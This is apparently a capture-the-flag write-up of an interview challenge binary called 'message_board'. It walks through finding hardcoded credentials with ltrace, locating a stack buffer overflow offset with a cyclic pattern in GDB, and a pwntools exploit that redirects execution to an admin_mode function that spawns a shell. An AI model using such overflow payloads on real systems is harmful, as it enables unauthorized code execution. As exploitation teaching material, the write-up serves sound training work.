# Message Board

### Challenge: Reverse Engineering and PWN

### Tools: GDB, Ltrace, Python

This was a challenge created for an interview process that combines RE and PWN. It was stated that I was unable to use Ghidra as that would make it too easy.

Starting off we can see we need a username and password.

```console
└──╼ [★]$ ./message_board 
Message Board Writer

Log in and leave a message to your administrator

User: me  
Password: me
Error: Invalid username or password
```

Running ltrace reveals the username=user and the password=easy_pass (ltrace was not working in pwnbox at the time of writing this but it shouldnt be too hard to understand)


After logging in we can finally leave a message. This is where we can cause our buffer overflow.

```console
└──╼ [★]$ ./message_board 
Message Board Writer

Log in and leave a message to your administrator

User: user
Password: easy_pass
Message: all your 0x belong to us
Sending: all your 0x belong to us
Goodbye!
```

By running info func in GDB we can see an interesting function named Admin_mode, safe to say this is where we want to get to with our buffer overflow.

```console
pwndbg> info func
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401030  strncmp@plt
0x0000000000401040  puts@plt
0x0000000000401050  strlen@plt
0x0000000000401060  system@plt
0x0000000000401070  printf@plt
0x0000000000401080  memset@plt
0x0000000000401090  fgets@plt
0x00000000004010a0  calloc@plt
0x00000000004010b0  strcmp@plt
0x00000000004010c0  fflush@plt
0x00000000004010d0  fwrite@plt
0x00000000004010e0  _start
0x0000000000401110  _dl_relocate_static_pie
0x0000000000401120  deregister_tm_clones
0x0000000000401150  register_tm_clones
0x0000000000401190  __do_global_dtors_aux
0x00000000004011c0  frame_dummy
0x00000000004011c2  read_input
0x0000000000401235  login
0x0000000000401326  admin_mode
0x0000000000401345  main
0x0000000000401400  __libc_csu_init
0x0000000000401460  __libc_csu_fini
0x0000000000401464  _fini
pwndbg> 
```

So lets create a payload to find the offset.

```console
echo -en "user\neasy_pass\n$(cyclic 1000) > payload
```

Running it in GDB we can see that it had a segmentation fault and stopped in $RBP with'uaaavaaa'.

```console
pwndbg> r < payload
Starting program: /home/htb-0xrogue/my_data/HTB/RE/message_board < payload
Message Board Writer

Log in and leave a message to your administrator

User: Password: Message: Sending: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabga
Goodbye!

Program received signal SIGSEGV, Segmentation fault.
0x00000000004013f6 in main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────[ REGISTERS ]──────────────────────────────────
 RAX  0x0
 RBX  0x0
 RCX  0x7ffff7ed4f33 (write+19) ◂— cmp    rax, -0x1000 /* 'H=' */
 RDX  0x0
 RDI  0x7ffff7fa7670 (_IO_stdfile_1_lock) ◂— 0x0
 RSI  0x4052a0 ◂— 'Goodbye!\nsword: Message: Sending: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabga\n'
 R8   0x9
 R9   0x88
 R10  0x7fffffffdf30 ◂— 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabga'
 R11  0x246
 R12  0x4010e0 (_start) ◂— xor    ebp, ebp
 R13  0x0
 R14  0x0
 R15  0x0
 RBP  0x6161617661616175 ('uaaavaaa')
 RSP  0x7fffffffdf88 ◂— 'waaaxaaayaaazaabbaabcaabdaabeaabfaabga'
 RIP  0x4013f6 (main+177) ◂— ret    
───────────────────────────────────[ DISASM ]───────────────────────────────────
 ► 0x4013f6 <main+177>    ret    <0x6161617861616177>










───────────────────────────────────[ STACK ]────────────────────────────────────
00:0000│ rsp 0x7fffffffdf88 ◂— 'waaaxaaayaaazaabbaabcaabdaabeaabfaabga'
01:0008│     0x7fffffffdf90 ◂— 'yaaazaabbaabcaabdaabeaabfaabga'
02:0010│     0x7fffffffdf98 ◂— 'baabcaabdaabeaabfaabga'
03:0018│     0x7fffffffdfa0 ◂— 'daabeaabfaabga'
04:0020│     0x7fffffffdfa8 ◂— 0x616762616166 /* 'faabga' */
05:0028│     0x7fffffffdfb0 ◂— 0x0
06:0030│     0x7fffffffdfb8 ◂— 0xc452380b2e871259
07:0038│     0x7fffffffdfc0 —▸ 0x4010e0 (_start) ◂— xor    ebp, ebp
─────────────────────────────────[ BACKTRACE ]──────────────────────────────────
 ► f 0         0x4013f6 main+177
   f 1 0x6161617861616177
   f 2 0x6261617a61616179
   f 3 0x6261616362616162
   f 4 0x6261616562616164
   f 5   0x616762616166
   f 6              0x0
────────────────────────────────────────────────────────────────────────────────
pwndbg> 
```
Our offset is 84. Then add 4 to get to the end of $RBP and that gives 88 where our segmentation fault occurs and we can start writing a new address to jump too.

```console
cyclic -l vaaa
84
```
We can also see that in $rsp that on address line 0x7fffffffdf80 that an address is being read and we can overwrite this.

```console
0x7fffffffdf20:	0xffffe078	0x00007fff	0x00000000	0x00000001
0x7fffffffdf30:	0x61616161	0x61616162	0x61616163	0x61616164
0x7fffffffdf40:	0x61616165	0x61616166	0x61616167	0x61616168
0x7fffffffdf50:	0x61616169	0x6161616a	0x6161616b	0x6161616c
0x7fffffffdf60:	0x6161616d	0x6161616e	0x6161616f	0x61616170
0x7fffffffdf70:	0x61616171	0x61616172	0x61616173	0x61616174
0x7fffffffdf80:	0x61616175	0x00616176	0xf7e0cd00	0x00007fff
0x7fffffffdf90:	0xffffe078	0x00007fff	0x00000000	0x00000001
0x7fffffffdfa0:	0x00401345	0x00000000	0xf7e0c7cf	0x00007fff
0x7fffffffdfb0:	0x00000000	0x00000000	0x74d22510	0x0b68a730
0x7fffffffdfc0:	0x004010e0	0x00000000	0x00000000	0x00000000
0x7fffffffdfd0:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffdfe0:	0xe3f22510	0xf497584f
```

Since we want the address to take us to admin_mode we will use the address that calls to admin_mode from main. You could also disassemble admin_mode and use the starting address in there "0x401326" 

```console
pwndbg> disassemble main
Dump of assembler code for function main:
   0x0000000000401345 <+0>:	push   rbp
   0x0000000000401346 <+1>:	mov    rbp,rsp
   0x0000000000401349 <+4>:	sub    rsp,0x60
   0x000000000040134d <+8>:	mov    DWORD PTR [rbp-0x54],edi
   0x0000000000401350 <+11>:	mov    QWORD PTR [rbp-0x60],rsi
   0x0000000000401354 <+15>:	mov    DWORD PTR [rbp-0x4],0x0
   0x000000000040135b <+22>:	lea    rdi,[rip+0xd06]        # 0x402068
   0x0000000000401362 <+29>:	call   0x401040 <puts@plt>
   0x0000000000401367 <+34>:	mov    eax,0x0
   0x000000000040136c <+39>:	call   0x401235 <login>
   0x0000000000401371 <+44>:	xor    eax,0x1
   0x0000000000401374 <+47>:	test   al,al
   0x0000000000401376 <+49>:	je     0x40139f <main+90>
   0x0000000000401378 <+51>:	mov    rax,QWORD PTR [rip+0x2d41]        # 0x4040c0 <stderr@@GLIBC_2.2.5>
   0x000000000040137f <+58>:	mov    rcx,rax
   0x0000000000401382 <+61>:	mov    edx,0x24
   0x0000000000401387 <+66>:	mov    esi,0x1
   0x000000000040138c <+71>:	lea    rdi,[rip+0xd1d]        # 0x4020b0
   0x0000000000401393 <+78>:	call   0x4010d0 <fwrite@plt>
   0x0000000000401398 <+83>:	mov    eax,0xffffffff
   0x000000000040139d <+88>:	jmp    0x4013f5 <main+176>
   0x000000000040139f <+90>:	lea    rax,[rbp-0x50]
   0x00000000004013a3 <+94>:	mov    edx,0x80
   0x00000000004013a8 <+99>:	mov    rsi,rax
   0x00000000004013ab <+102>:	lea    rdi,[rip+0xd23]        # 0x4020d5
   0x00000000004013b2 <+109>:	call   0x4011c2 <read_input>
   0x00000000004013b7 <+114>:	lea    rax,[rbp-0x50]
   0x00000000004013bb <+118>:	mov    rsi,rax
   0x00000000004013be <+121>:	lea    rdi,[rip+0xd1a]        # 0x4020df
   0x00000000004013c5 <+128>:	mov    eax,0x0
   0x00000000004013ca <+133>:	call   0x401070 <printf@plt>
   0x00000000004013cf <+138>:	mov    eax,DWORD PTR [rip+0x2cab]        # 0x404080 <g_flag2>
   0x00000000004013d5 <+144>:	cmp    DWORD PTR [rbp-0x4],eax
   0x00000000004013d8 <+147>:	jne    0x4013e4 <main+159>
   0x00000000004013da <+149>:	mov    eax,0x0
   0x00000000004013df <+154>:	call   0x401326 <admin_mode>
   0x00000000004013e4 <+159>:	lea    rdi,[rip+0xd01]        # 0x4020ec
   0x00000000004013eb <+166>:	call   0x401040 <puts@plt>
   0x00000000004013f0 <+171>:	mov    eax,0x0
   0x00000000004013f5 <+176>:	leave  
=> 0x00000000004013f6 <+177>:	ret    
End of assembler dump.
```

Now that we have our address and offset we can create our exploit. The cyclic offset was 88 but we need to add a \x00 to terminate it and begin inputing the address. Also the address needs a few null bytes to also read properly.

```python
#!/usr/bin/python3
from pwn import *

#context(os='linux', arch='amd64')
#libc = ELF('/home/htb-0xrogue/Downloads/challenge/glibc/libc.so.6')
e = ELF('message_board')
context.binary = e
p = e.process()
#p = remote("", )
junk="A"*87 + "\x00"
#system_call = p64(0x400700)
p.sendline("user")
p.sendline("easy_pass")
#p.recvline()
payload=(junk + "\xdf\x13\x40\x00\x00\x00\x00\x00")
#raw_input()
p.sendline(payload)
#p.sendline("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
p.recvline()
p.interactive()
```

When we run our exploit we get a successful shell on the host computer!

```console
└──╼ [★]$ python3 sol.py
Log in and leave a message to your administrator

User: Password: Message: Sending: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Goodbye!

Welcome to admin mode! Spawning shell.
$ id
uid=1000(htb-0xrogue) gid=1003(htb-0xrogue) groups=1003(htb-0xrogue),27(sudo)
```

Pretty cool for an interview challenge and a bit different from the HTB challenges that I am use too. I also tried the following method of delivering a payload but I kept getting a segmentation fault after getting a shell.

```console
└──╼ [★]$ echo -en "user\neasy_pass\n$(cyclic 87)\x00\x26\x13\x40\x00\x00\x00\x00\x00" > payload3
─[us-dedivip-1]─[10.10.14.93]─[htb-0xrogue@pwnbox-base]─[~/my_data/HTB/RE]
└──╼ [★]$ ./message_board < payload3
Message Board Writer

Log in and leave a message to your administrator

User: Password: Message: Sending: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaava
Goodbye!

Welcome to admin mode! Spawning shell.
Segmentation fault
```

GG
